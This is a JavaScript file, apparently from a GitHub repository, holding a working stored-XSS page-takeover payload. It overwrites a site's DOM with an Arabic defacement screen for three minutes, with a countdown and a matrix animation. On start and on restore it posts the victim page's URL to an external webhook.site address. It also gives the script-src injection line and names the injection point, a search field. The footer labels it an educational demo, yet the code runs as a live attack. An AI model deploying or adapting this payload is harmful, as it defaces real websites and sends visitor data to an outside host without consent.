// xss-attack-demo.js - Full Page Takeover (3 Minutes)
// Repository: ahasM/ha
// Webhook: https://webhook.site/ecb8bfe3-a34e-4d84-a890-40f1091b0b24

(function() {
    'use strict';
    
    // منع التنفيذ المتكرر
    if (window.__page_takeover_active) {
        console.warn('[XSS-TAKEOVER] Already active');
        return;
    }
    window.__page_takeover_active = true;
    
    console.log('[XSS-TAKEOVER] 🚀 Starting 3-minute page takeover...');
    
    // حفظ المحتوى الأصلي
    const originalHTML = document.documentElement.innerHTML;
    const originalTitle = document.title;
    const originalBodyStyle = document.body.style.cssText;
    
    // إرسال إشعار للـ Webhook
    fetch('https://webhook.site/ecb8bfe3-a34e-4d84-a890-40f1091b0b24', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
            event: 'page_takeover_started',
            url: window.location.href,
            time: new Date().toISOString(),
            source: 'ahasM/ha/xss-attack-demo.js'
        })
    });
    
    // صفحة الهجوم الكاملة
    const attackPage = `
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>⚠️ ثغرة أمنية - XSS Vulnerability</title>
        <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Cairo', sans-serif;
            }
            
            body {
                background: #0a0a0a;
                color: #ffffff;
                min-height: 100vh;
                overflow: hidden;
                position: relative;
            }
            
            .matrix-bg {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                opacity: 0.3;
                z-index: -1;
            }
            
            .container {
                max-width: 900px;
                margin: 50px auto;
                padding: 40px;
                background: rgba(0, 20, 0, 0.85);
                border: 2px solid #00ff00;
                border-radius: 20px;
                box-shadow: 0 0 50px rgba(0, 255, 0, 0.3);
                text-align: center;
                position: relative;
                overflow: hidden;
            }
            
            .container::before {
                content: '';
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: linear-gradient(45deg, transparent, rgba(0, 255, 0, 0.1), transparent);
                animation: scan 4s linear infinite;
                z-index: -1;
            }
            
            @keyframes scan {
                0% { transform: translateY(-100%) translateX(-100%) rotate(0deg); }
                100% { transform: translateY(100%) translateX(100%) rotate(360deg); }
            }
            
            h1 {
                color: #ff0000;
                font-size: 3.5rem;
                margin-bottom: 20px;
                text-shadow: 0 0 20px #ff0000;
                animation: glow 1.5s infinite alternate;
            }
            
            @keyframes glow {
                from { text-shadow: 0 0 10px #ff0000; }
                to { text-shadow: 0 0 30px #ff0000, 0 0 40px #ff0000; }
            }
            
            .subtitle {
                color: #00ffff;
                font-size: 1.8rem;
                margin-bottom: 30px;
                border-bottom: 2px solid #00ffff;
                padding-bottom: 15px;
                display: inline-block;
            }
            
            .countdown-container {
                background: rgba(0, 0, 0, 0.7);
                border: 3px solid #ff9900;
                border-radius: 15px;
                padding: 30px;
                margin: 30px 0;
                display: inline-block;
            }
            
            .countdown {
                font-size: 4rem;
                font-family: 'Courier New', monospace;
                color: #ff9900;
                font-weight: bold;
                text-shadow: 0 0 15px #ff9900;
            }
            
            .message-box {
                background: rgba(255, 0, 0, 0.1);
                border-left: 5px solid #ff0000;
                padding: 20px;
                margin: 20px 0;
                text-align: right;
                border-radius: 0 10px 10px 0;
            }
            
            .info-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin: 30px 0;
            }
            
            .info-card {
                background: rgba(0, 100, 255, 0.1);
                border: 1px solid #0066ff;
                border-radius: 10px;
                padding: 20px;
                text-align: right;
            }
            
            .info-card h3 {
                color: #0066ff;
                margin-bottom: 10px;
                font-size: 1.3rem;
            }
            
            .buttons {
                margin-top: 30px;
                display: flex;
                justify-content: center;
                gap: 20px;
                flex-wrap: wrap;
            }
            
            .btn {
                padding: 15px 30px;
                font-size: 1.2rem;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                transition: all 0.3s;
                font-weight: bold;
                min-width: 200px;
            }
            
            .btn-reload {
                background: linear-gradient(45deg, #00ff00, #00cc00);
                color: #000;
            }
            
            .btn-reload:hover {
                background: linear-gradient(45deg, #00cc00, #00ff00);
                transform: scale(1.05);
                box-shadow: 0 0 20px #00ff00;
            }
            
            .btn-details {
                background: linear-gradient(45deg, #0066ff, #0033cc);
                color: white;
            }
            
            .btn-details:hover {
                background: linear-gradient(45deg, #0033cc, #0066ff);
                transform: scale(1.05);
                box-shadow: 0 0 20px #0066ff;
            }
            
            .footer {
                margin-top: 40px;
                color: #888;
                font-size: 0.9rem;
                border-top: 1px solid #444;
                padding-top: 20px;
            }
            
            .hacker-console {
                background: #000;
                border: 2px solid #00ff00;
                border-radius: 10px;
                padding: 20px;
                margin: 20px 0;
                text-align: left;
                font-family: 'Courier New', monospace;
                font-size: 0.9rem;
                color: #00ff00;
                max-height: 200px;
                overflow-y: auto;
            }
            
            .console-line {
                margin-bottom: 5px;
                padding-left: 10px;
                border-left: 2px solid #00ff00;
            }
            
            @media (max-width: 768px) {
                .container {
                    margin: 20px;
                    padding: 20px;
                }
                
                h1 {
                    font-size: 2.5rem;
                }
                
                .countdown {
                    font-size: 3rem;
                }
                
                .btn {
                    min-width: 150px;
                }
            }
        </style>
    </head>
    <body>
        <canvas class="matrix-bg" id="matrixCanvas"></canvas>
        
        <div class="container">
            <h1>🚨 ثغرة أمنية حرجة</h1>
            <div class="subtitle">CROSS-SITE SCRIPTING (XSS) VULNERABILITY</div>
            
            <div class="countdown-container">
                <div>الصفحة ستعود تلقائياً خلال:</div>
                <div class="countdown" id="countdownDisplay">03:00</div>
                <div style="margin-top: 10px; color: #aaa; font-size: 0.9rem;">
                    ⏱️ العد التنازلي: <span id="secondsCount">180</span> ثانية
                </div>
            </div>
            
            <div class="message-box">
                <h3>⚠️ تنبيه أمني عاجل</h3>
                <p>تم اكتشاف ثغرة XSS خطيرة في هذا الموقع تسمح بتنفيذ كود خارجي.</p>
                <p>• المصدر: GitHub Repository (ahasM/ha)</p>
                <p>• نوع الهجوم: Persistent XSS via Search Field</p>
                <p>• الخطر: سرقة بيانات المستخدمين والتحكم الكامل بالصفحة</p>
            </div>
            
            <div class="info-grid">
                <div class="info-card">
                    <h3>🔍 معلومات الهجوم</h3>
                    <p>• الوقت: <span id="attackTime">${new Date().toLocaleString('ar-SA')}</span></p>
                    <p>• الموقع: <span id="attackUrl">${window.location.hostname}</span></p>
                    <p>• المصدر: ahasM/ha/xss-attack-demo.js</p>
                </div>
                
                <div class="info-card">
                    <h3>🎯 المخاطر المحتملة</h3>
                    <p>• سرقة الكوكيز والبيانات</p>
                    <p>• تعديل محتوى الصفحة</p>
                    <p>• إعادة التوجيه لمواقع ضارة</p>
                    <p>• Keylogging وتتبع المستخدم</p>
                </div>
                
                <div class="info-card">
                    <h3>🛡️ الحلول المقترحة</h3>
                    <p>• تصفية مدخلات المستخدم</p>
                    <p>• تفعيل Content Security Policy</p>
                    <p>• استخدام HttpOnly cookies</p>
                    <p>• تحديث المكتبات والأطر</p>
                </div>
            </div>
            
            <div class="hacker-console" id="hackerConsole">
                <div class="console-line">> [SYSTEM] Initializing XSS payload...</div>
                <div class="console-line">> [INFO] Source: https://raw.githubusercontent.com/ahasM/ha/main/xss-attack-demo.js</div>
                <div class="console-line">> [WARNING] Page takeover in progress...</div>
                <div class="console-line">> [TIMER] Auto-restore initiated (180s countdown)</div>
                <div class="console-line">> [STATUS] Original page content backed up</div>
                <div class="console-line">> [ALERT] Security vulnerability confirmed</div>
            </div>
            
            <div class="buttons">
                <button class="btn btn-reload" onclick="restoreOriginalPage()">
                    🔄 إعادة تحميل الموقع الأصلي
                </button>
                <button class="btn btn-details" onclick="showTechnicalDetails()">
                    📊 عرض التفاصيل التقنية
                </button>
            </div>
            
            <div class="footer">
                <p>هذا العرض التوضيحي لأغراض التعليم والاختبار الأمني فقط</p>
                <p>© ${new Date().getFullYear()} - Security Awareness Demo | Repository: ahasM/ha</p>
                <p style="font-size: 0.8rem; margin-top: 10px; color: #666;">
                    يتم تسجيل هذا الحدث في: https://webhook.site/ecb8bfe3-a34e-4d84-a890-40f1091b0b24
                </p>
            </div>
        </div>
        
        <script>
            // رسم خلفية المصفوفة
            const canvas = document.getElementById('matrixCanvas');
            const ctx = canvas.getContext('2d');
            
            function resizeCanvas() {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            }
            
            resizeCanvas();
            window.addEventListener('resize', resizeCanvas);
            
            const chars = "01アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン";
            const charArray = chars.split("");
            const fontSize = 14;
            const columns = canvas.width / fontSize;
            const drops = Array(Math.floor(columns)).fill(1);
            
            function drawMatrix() {
                ctx.fillStyle = 'rgba(10, 10, 10, 0.05)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                ctx.fillStyle = '#0F0';
                ctx.font = fontSize + 'px monospace';
                
                for(let i = 0; i < drops.length; i++) {
                    const text = charArray[Math.floor(Math.random() * charArray.length)];
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                    
                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }
            
            setInterval(drawMatrix, 50);
            
            // العد التنازلي
            let secondsLeft = 180;
            const countdownElement = document.getElementById('countdownDisplay');
            const secondsElement = document.getElementById('secondsCount');
            const consoleElement = document.getElementById('hackerConsole');
            
            function updateCountdown() {
                const minutes = Math.floor(secondsLeft / 60);
                const seconds = secondsLeft % 60;
                
                countdownElement.textContent = \`\${minutes.toString().padStart(2, '0')}:\${seconds.toString().padStart(2, '0')}\`;
                secondsElement.textContent = secondsLeft;
                
                // إضافة سطر جديد في الكونسول كل 30 ثانية
                if (secondsLeft % 30 === 0 && secondsLeft < 180) {
                    const newLine = document.createElement('div');
                    newLine.className = 'console-line';
                    newLine.textContent = \`> [TIMER] \${minutes}m \${seconds}s remaining until restore\`;
                    consoleElement.appendChild(newLine);
                    consoleElement.scrollTop = consoleElement.scrollHeight;
                }
                
                if (secondsLeft <= 0) {
                    restoreOriginalPage();
                } else {
                    secondsLeft--;
                    setTimeout(updateCountdown, 1000);
                }
            }
            
            // حفظ المحتوى الأصلي في نطاق عام
            window.originalPageContent = {
                html: \`${originalHTML.replace(/`/g, '\\`').replace(/\$/g, '\\$')}\`,
                title: '${originalTitle.replace(/'/g, "\\'")}',
                bodyStyle: '${originalBodyStyle.replace(/'/g, "\\'")}'
            };
            
            // استعادة الصفحة الأصلية
            function restoreOriginalPage() {
                console.log('[XSS-TAKEOVER] Restoring original page...');
                
                // إرسال إشعار للـ Webhook
                fetch('https://webhook.site/ecb8bfe3-a34e-4d84-a890-40f1091b0b24', {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        event: 'page_takeover_ended',
                        url: window.location.href,
                        duration: (180 - secondsLeft) + ' seconds',
                        time: new Date().toISOString()
                    })
                });
                
                // استعادة المحتوى
                document.documentElement.innerHTML = window.originalPageContent.html;
                document.title = window.originalPageContent.title;
                document.body.style.cssText = window.originalPageContent.bodyStyle;
                
                // إعادة تحميل نظيفة
                setTimeout(() => {
                    window.location.reload();
                }, 500);
            }
            
            // عرض التفاصيل التقنية
            function showTechnicalDetails() {
                const details = \`
                🔧 التفاصيل التقنية:
                
                • نوع الهجوم: Persistent XSS (Stored)
                • نقطة الدخول: حقل البحث (/ar/home/search)
                • طريقة الحقن: POST request مع CSRF Token
                • Payload: <script src="https://raw.githubusercontent.com/ahasM/ha/main/xss-attack-demo.js"></script>
                • التأثير: استبدال كامل DOM الصفحة
                • المدة: 3 دقائق (قابلة للتعديل)
                • التسجيل: https://webhook.site/ecb8bfe3-a34e-4d84-a890-40f1091b0b24
                
                📈 إحصائيات:
                • وقت التنفيذ: \${new Date().toLocaleString('ar-SA')}
                • الـ User Agent: \${navigator.userAgent}
                • الـ Referrer: \${document.referrer || 'None'}
                • الـ Cookies: \${document.cookie ? 'Present' : 'None'}
                \`;
                
                alert(details);
            }
            
            // بدء العد التنازلي
            updateCountdown();
            
            // إضافة أزرار التحكم للمطور
            const devControls = document.createElement('div');
            devControls.style.cssText = 'position:fixed;bottom:10px;left:10px;background:rgba(0,0,0,0.8);padding:10px;border-radius:5px;z-index:99999;';
            devControls.innerHTML = \`
                <button onclick="secondsLeft=10" style="background:red;color:white;border:none;padding:5px;margin:2px;border-radius:3px;cursor:pointer;">⏩ سريع</button>
                <button onclick="restoreOriginalPage()" style="background:green;color:white;border:none;padding:5px;margin:2px;border-radius:3px;cursor:pointer;">🔄 استعادة</button>
            \`;
            document.body.appendChild(devControls);
            
            console.log('[XSS-TAKEOVER] Page takeover initialized successfully');
        </script>
    </body>
    </html>
    `;
    
    // استبدال الصفحة
    document.open();
    document.write(attackPage);
    document.close();
    
    console.log('[XSS-TAKEOVER] Page replaced with attack interface');
    
})();